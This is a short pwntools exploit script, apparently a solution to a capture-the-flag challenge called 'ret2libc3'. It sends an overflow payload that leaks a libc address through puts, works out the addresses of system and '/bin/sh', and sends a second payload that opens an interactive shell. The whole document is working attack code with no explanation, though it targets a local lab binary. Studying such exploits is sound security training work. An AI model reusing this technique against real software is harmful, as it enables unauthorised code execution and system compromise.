from pwn import *

libc = ELF('libc.so.sys')
ret = ELF('ret2libc3')

p = process('./ret2libc3')
gdb.attach(p)
put_plt = ret.symbols['puts']
main_addr = ret.symbols['main']
libc_addr = ret.got['__libc_start_main']

playload = 'A'*112 + p32(put_plt) + p32(main_addr) + p32(libc_addr)
p.sendlineafter('Can you find it !?',playload)
libc_real = u32(p.recv(4))
print hex(libc_real)

sys_addr = libc_real - (libc.symbols['__libc_start_main'] - libc.symbols['system'] )
bin_addr = libc_real - (libc.symbols['__libc_start_main'] - next(libc.search('/bin/sh') ) )
print hex(sys_addr) + '\n' + hex(bin_addr)
playload2 = 'A'*104 + p32(sys_addr) + 'BBBB' + p32(bin_addr)
p.sendline(playload2)
p.interactive()
